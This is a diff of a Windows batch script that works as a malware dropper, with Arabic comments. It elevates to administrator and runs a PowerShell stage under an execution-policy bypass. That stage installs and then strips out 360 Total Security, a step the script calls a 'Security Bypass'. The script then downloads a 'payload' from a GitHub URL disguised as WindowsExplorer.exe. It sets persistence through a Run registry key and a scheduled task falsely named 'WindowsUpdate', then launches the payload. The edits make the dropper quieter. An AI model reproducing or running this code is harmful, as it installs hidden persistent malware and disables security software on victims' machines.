@@ -1,43 +1,38 @@
 @echo off
-echo [1] checking privileges...
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [!] Requesting Admin...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-echo [2] Creating setup.ps1...
+echo [1] Starting Installation and Security Bypass...
 (
 echo Write-Host "[PS] Starting Setup..."
 echo $installerPath = "$env:TEMP\360.exe"
 echo $url = "https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe"
-echo Write-Host "[PS] Downloading from $url"
-echo try {
-echo     (New-Object System.Net.WebClient).DownloadFile($url, $installerPath)
-echo     Write-Host "[PS] Download Complete. Installing..."
-echo     Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
-echo     Write-Host "[PS] Waiting 45 seconds..."
-echo     Start-Sleep -Seconds 45
-echo     Write-Host "[PS] Cleaning up..."
-echo     Stop-Process -Name "360tray" -Force -ErrorAction SilentlyContinue
-echo     Remove-Item -Path "C:\Program Files (x86)\360" -Recurse -Force -ErrorAction SilentlyContinue
-echo     Remove-Item -Path $installerPath -Force
-echo     Write-Host "[PS] Cleanup Finished."
-echo } catch { Write-Host "[!] Error: $_" }
+echo Write-Host "[PS] Downloading..."
+echo (New-Object System.Net.WebClient).DownloadFile($url, $installerPath)
+echo Write-Host "[PS] Installing..."
+echo Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
+echo Start-Sleep -Seconds 45
+echo Stop-Process -Name "360tray" -Force -ErrorAction SilentlyContinue
+echo Remove-Item -Path "C:\Program Files (x86)\360" -Recurse -Force -ErrorAction SilentlyContinue
+echo Remove-Item -Path $installerPath -Force
+echo Write-Host "[PS] Cleanup Finished."
 ) > "%temp%\setup.ps1"
 
-echo [3] Executing Setup (Watch the window)...
-:: إزالة -WindowStyle Hidden لنرى الأخطاء
 powershell -ExecutionPolicy Bypass -File "%temp%\setup.ps1"
+del "%temp%\setup.ps1"
 
-echo [4] Downloading main payload...
+echo [2] Downloading Payload...
 bitsadmin /transfer job1 /download /priority normal https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe "%programdata%\GG-Win\WindowsExplorer.exe"
-if %errorLevel% neq 0 echo [!] Bitsadmin failed!
 
-echo [5] Setting up persistence...
+echo [3] Setting up Persistence...
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe" /f
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
+start "" "%programdata%\GG-Win\WindowsExplorer.exe"
 
-echo [6] Done. Press any key to close.
-pause
+echo [4] Task Completed Successfully. 
+echo The window will remain open until you close it manually.
+:: هذا الأمر يبقي النافذة مفتوحة
+cmd /k
